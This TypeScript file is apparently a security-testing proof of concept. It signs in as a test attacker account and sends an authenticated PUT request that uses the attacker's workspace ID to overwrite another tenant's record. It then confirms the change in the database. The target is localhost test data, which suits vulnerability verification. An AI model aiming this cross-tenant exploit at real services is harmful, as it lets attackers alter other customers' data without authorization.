import 'dotenv/config';
import { createClient } from '@supabase/supabase-js';
import { PrismaClient } from '@prisma/client';

const supabase = createClient(process.env.SUPABASE_URL!, process.env.SUPABASE_ANON_KEY!);
const prisma = new PrismaClient();

const ATTACKER_EMAIL = 'attacker@sec-test.com';
const PASSWORD = 'SecTestPassword123!';

// IDs from setup (In a real scenario, these would be discovered via recon)
// We will grab them from the DB for the proof of concept
async function run() {
  console.log('--- Verifying IDOR: Tenant Update ---');

  const attackerUser = await prisma.user.findUnique({ where: { email: ATTACKER_EMAIL } });
  const attackerWorkspace = await prisma.workspace.findFirst({ where: { name: 'SEC_TEST_ATTACKER_WS' } });
  const victimTenant = await prisma.tenant.findFirst({ where: { name: 'Victim Tenant' } });

  if (!attackerUser || !attackerWorkspace || !victimTenant) {
    console.error('Setup data not found. Run setup.ts first.');
    return;
  }

  // 1. Sign in as Attacker to get JWT
  const { data: auth, error: loginError } = await supabase.auth.signInWithPassword({
    email: ATTACKER_EMAIL,
    password: PASSWORD,
  });

  if (loginError) {
    console.error('Login failed:', loginError.message);
    return;
  }

  const token = auth.session.access_token;
  const baseUrl = 'http://localhost:3001';

  // 2. Attempt to update VICTIM tenant using ATTACKER workspace ID in URL
  console.log(`Targeting Victim Tenant: ${victimTenant.id}`);
  console.log(`Using Attacker Workspace: ${attackerWorkspace.id}`);

  const payload = {
    name: 'PWNED BY ATTACKER',
    email: 'pwned@attacker.com'
  };

  const response = await fetch(`${baseUrl}/api/workspaces/${attackerWorkspace.id}/tenants/${victimTenant.id}`, {
    method: 'PUT',
    headers: {
      'Authorization': `Bearer ${token}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  });

  const result = await response.json();

  if (response.status === 200) {
    console.log('✅ VULNERABILITY CONFIRMED: Tenant update successful across workspace boundaries!');
    console.log('Response:', JSON.stringify(result, null, 2));
    
    // Verify in DB
    const updatedTenant = await prisma.tenant.findUnique({ where: { id: victimTenant.id } });
    if (updatedTenant?.name === 'PWNED BY ATTACKER') {
      console.log('📊 DATABASE VERIFICATION: Data was actually modified.');
    } else {
      console.log('❌ Database verification failed. Maybe the update didn\'t stick?');
    }
  } else {
    console.log(`❌ VULNERABILITY NOT EXPLOITED: Server returned status ${response.status}`);
    console.log('Response:', JSON.stringify(result, null, 2));
  }

  await prisma.$disconnect();
}

run();
